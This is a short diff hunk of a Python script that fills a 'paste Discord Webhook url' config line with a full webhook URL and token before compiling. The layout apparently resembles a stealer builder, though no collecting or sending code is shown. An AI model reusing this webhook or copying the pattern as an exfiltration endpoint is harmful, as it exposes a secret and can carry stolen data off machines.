@@ -28,7 +28,7 @@ from shutil import copyfile
 from sys import argv
 
 # CONFIG -> Setup before compiling
-url= "" #Paste Discord Webhook url
+url= "https://discord.com/api/webhooks/1445198136925487367/SZBBCwgPNqBhjsZd-QgrsXsegRCgXbAZHw-xHRe746OdALRVEjKvdB0XvnKFZboqXNFq" #Paste Discord Webhook url
 
 
 
